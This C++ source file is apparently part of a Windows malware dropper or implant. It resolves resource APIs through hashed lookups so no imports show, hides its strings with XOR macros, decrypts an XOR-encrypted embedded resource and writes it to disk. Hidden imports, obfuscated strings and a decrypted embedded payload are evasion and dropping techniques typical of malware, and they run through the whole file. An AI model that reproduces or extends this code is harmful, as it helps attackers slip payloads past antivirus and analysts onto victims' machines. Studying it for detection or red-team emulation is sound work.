#include "util/resource_util.hpp"

#ifndef NO_WIN_API_HASHING
    #include "util/winapihelper.hpp"
#endif

namespace resource_util {

// Get and decrypt resource data - throws exception on failure
std::vector<char> ReadResource(int id) {
#ifndef NO_WIN_API_HASHING
    DWORD error_code;
    FP_FindResourceW findResourceW = (FP_FindResourceW)winapi_helper::GetAPI(0x3c704e45, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (findResourceW == NULL || error_code != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for FindResourceW. Error code"), error_code));
    }
    FP_LoadResource loadResource = (FP_LoadResource)winapi_helper::GetAPI(0xdcde594d, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (loadResource == NULL || error_code != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for LoadResource. Error code"), error_code));
    }
    FP_LockResource lockResource = (FP_LockResource)winapi_helper::GetAPI(0x145a9296, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (lockResource == NULL || error_code != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for LockResource. Error code"), error_code));
    }
    FP_SizeofResource sizeofResource = (FP_SizeofResource)winapi_helper::GetAPI(0x0c17a85d, XOR_WIDE_LIT(L"Kernel32.dll"), &error_code);
    if (sizeofResource == NULL || error_code != ERROR_SUCCESS) {
        throw std::runtime_error(std::format("{}: {}", XOR_LIT("Failed to get address for SizeofResource. Error code"), error_code));
    }
#endif

#ifndef NO_WIN_API_HASHING
    HRSRC h_resource = findResourceW(
#else
    HRSRC h_resource = FindResourceW(
#endif
        NULL,
        MAKEINTRESOURCEW(id),
        MAKEINTRESOURCEW(10) // RCDATA type
    );
    if (h_resource == NULL) {
        throw std::runtime_error(std::format("{} {}. Error code: {}", XOR_LIT("Could not find resource"), id, GetLastError()));
    }

#ifndef NO_WIN_API_HASHING
    HGLOBAL h_resource_data = loadResource(NULL, h_resource);
#else
    HGLOBAL h_resource_data = LoadResource(NULL, h_resource);
#endif
    if (h_resource_data == NULL) {
        throw std::runtime_error(std::format("{} {}. Error code: {}", XOR_LIT("Could not load resource"), id, GetLastError()));
    }

    // Per documentation: 
    // The pointer returned by LockResource is valid until the module containing the resource is unloaded.
#ifndef NO_WIN_API_HASHING
    char* buffer = static_cast<char*>(lockResource(h_resource_data));
#else
    char* buffer = static_cast<char*>(LockResource(h_resource_data));
#endif
    if (buffer == NULL) {
        throw std::runtime_error(std::format("{} {}. Error code: {}", XOR_LIT("Unavailable resource"), id, GetLastError()));
    }

#ifndef NO_WIN_API_HASHING
    DWORD size = sizeofResource(NULL, h_resource);
#else
    DWORD size = SizeofResource(NULL, h_resource);
#endif
    if (size == 0) {
        throw std::runtime_error(std::format("{} {}. Error code: {}", XOR_LIT("Failed to get size of resource"), id, GetLastError()));
    }

    // Make writable copy of resource to decrypt and return
    std::vector<char> ret_vec(buffer, buffer + size);
    
    // XOR-decrypt
    std::vector<unsigned char> xor_key = encryption::XorKeyBytes;
    encryption::XorInPlace((unsigned char*)(&ret_vec[0]), ret_vec.size(), xor_key.data(), xor_key.size());
    return ret_vec;
}

// Fetch given resource and write it to disk. Will throw exception on error
void WriteResourceToDisk(int resource_id, LPCWSTR path) {
    std::vector<char> data = ReadResource(resource_id);
    DWORD result = os_util::WriteFileToDisk(path, data.data(), data.size());
    if (result != ERROR_SUCCESS) {
        throw std::runtime_error(std::format(
            "{} {} {} {}. Error code: {}",
            XOR_LIT("Failed to write resource ID"),
            resource_id,
            XOR_LIT("to disk at"),
            string_util::wstring_to_string(path),
            result
        ));
    }
}

} // namespace resource_util